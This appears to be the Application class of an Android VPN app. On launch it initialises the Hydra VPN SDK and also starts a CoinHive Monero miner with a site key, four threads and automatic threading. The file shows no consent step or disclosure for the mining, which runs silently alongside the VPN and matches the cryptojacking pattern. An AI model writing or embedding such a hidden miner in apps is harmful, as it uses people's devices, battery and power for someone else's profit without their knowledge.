package com.example.pavel.monero;

import android.app.Application;
import android.util.Log;

import com.anchorfree.hydrasdk.HydraSDKConfig;
import com.anchorfree.hydrasdk.HydraSdk;
import com.anchorfree.hydrasdk.api.ClientInfo;
import com.anchorfree.hydrasdk.vpnservice.connectivity.NotificationConfig;
import com.example.pavel.monero.serves.CoinHive;


public class App extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        initHydraSDK();
        initialMainer();
    }

    private void initHydraSDK(){
        ClientInfo clientInfo = ClientInfo.newBuilder()
                .baseUrl("https://backend.northghost.com")
                .carrierId("31415")
                .build();

        NotificationConfig notificationConfig = NotificationConfig.newBuilder()
                .title(getResources().getString(R.string.app_name))
                .enableConnectionLost()
                .build();

        HydraSdk.setLoggingLevel(Log.VERBOSE);

        HydraSDKConfig config = HydraSDKConfig.newBuilder()
                //traffic to these domains will not go through VPN
                .observeNetworkChanges(true) //sdk will handle network changes and start/stop vpn
                .captivePortal(true) //sdk will handle if user is behind captive portal wifi
                .build();
        HydraSdk.init(this, clientInfo, notificationConfig, config);

    }

    private void initialMainer() {
        CoinHive.getInstance()
                .init("7D1i4fiOWJEVdtZ6T17jBI3c61LHsI3p") // mandatory
                .setNumberOfThreads(4) // optional
                .setIsAutoThread(true) // optional
                .setThrottle(0.2) // optional
                .setLoggingEnabled(true) // To logcat mining status, false by default.
                .setForceASMJS(false); // optional;
    }
}
